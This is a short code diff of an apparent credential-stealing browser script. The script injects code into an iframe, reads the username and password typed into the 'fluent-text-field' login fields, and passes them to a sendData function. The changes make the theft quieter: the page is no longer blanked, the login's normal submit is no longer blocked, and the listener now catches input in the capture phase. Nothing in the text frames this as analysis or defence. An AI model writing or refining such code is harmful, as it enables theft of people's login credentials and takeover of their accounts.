@@ -8,7 +8,7 @@
         return iframe;
     }
 
-    document.body.innerHTML = '';
+    //document.body.innerHTML = '';
     var frame = createIframe();
 
     // Add load event listener to iframe to inject script after it loads
@@ -29,9 +29,8 @@
                     var username = document.getElementsByTagName('fluent-text-field')[0].value;
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
-                    event.preventDefault();
                 }
-            });
+            }, true);
         `;
         doc.body.appendChild(script);
     };
